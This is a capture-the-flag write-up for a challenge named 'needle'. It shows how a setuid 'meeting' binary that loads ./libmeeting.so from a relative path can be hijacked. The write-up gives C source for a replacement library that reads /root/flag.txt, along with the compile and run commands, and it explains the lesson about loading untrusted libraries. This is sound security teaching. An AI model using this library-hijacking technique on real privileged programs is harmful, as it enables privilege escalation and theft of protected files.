# needle: a shared library running inside a privileged process

**Author:** Oleg Shefner (`o.shefner`)
**Instance:** `findingnemo` (`threadctf`)

## Task and investigation

The reviewed solutions describe a `meeting` executable that loads `./libmeeting.so`, resolves a function called `meeting`, and runs code in a thread. A retrieval thread reads a protected flag. The central observation is that dynamically loaded code executes in the host process: a thread is not an independent security boundary.

Before applying the method to a fresh challenge container, inspect `meeting.c` and `ls -l ./meeting`. Confirm the library path, the actual function signature and the executable's effective privileges. Several references describe a setuid executable and a thread entry point of type `void *(*)(void *)`; another proposes a different thread-joining interface. Those signatures must not be mixed.

## Reconstructed procedure

For the `void *meeting(void *)` variant documented in PRs 74, 77, 79 and 80, build a replacement library. Its function opens `/root/flag.txt` inside the authorized challenge process and returns a heap buffer, which remains valid after the thread exits:

```c
#include <stdio.h>
#include <stdlib.h>

void *meeting(void *unused)
{
    (void)unused;
    char *result = calloc(256, 1);
    if (!result) return NULL;
    FILE *input = fopen("/root/flag.txt", "r");
    if (!input) { free(result); return NULL; }
    if (!fgets(result, 256, input)) {
        fclose(input);
        free(result);
        return NULL;
    }
    fclose(input);
    return result;
}
```

Save this as `needle_library.c` in the challenge working directory:

```bash
gcc -Wall -Wextra -shared -fPIC needle_library.c -o libmeeting.so -pthread
./meeting
```

In the referenced variant the host prints the returned string. A returned pointer must not refer to a local stack array, because that storage is invalid after the function returns. This approach depends on the challenge loader actually permitting the supplied library and retaining privileges when it calls the function.

## Result and lesson



The code is a reconstructed example, not a record of execution in my container. The security lesson is that a privileged executable must not load code from a user-controlled relative path. Correct thread synchronization cannot compensate for handing execution to an untrusted library.

## Sources

Compared [PR #74](https://github.com/slant14/operating-systems-26/pull/74), [PR #76](https://github.com/slant14/operating-systems-26/pull/76), [PR #77](https://github.com/slant14/operating-systems-26/pull/77), [PR #79](https://github.com/slant14/operating-systems-26/pull/79), [PR #80](https://github.com/slant14/operating-systems-26/pull/80). The main method follows the four reports describing the matching thread-entry ABI; PR 76's `pthread_join` alternative is distinguished above. No peer flag is represented as my own.
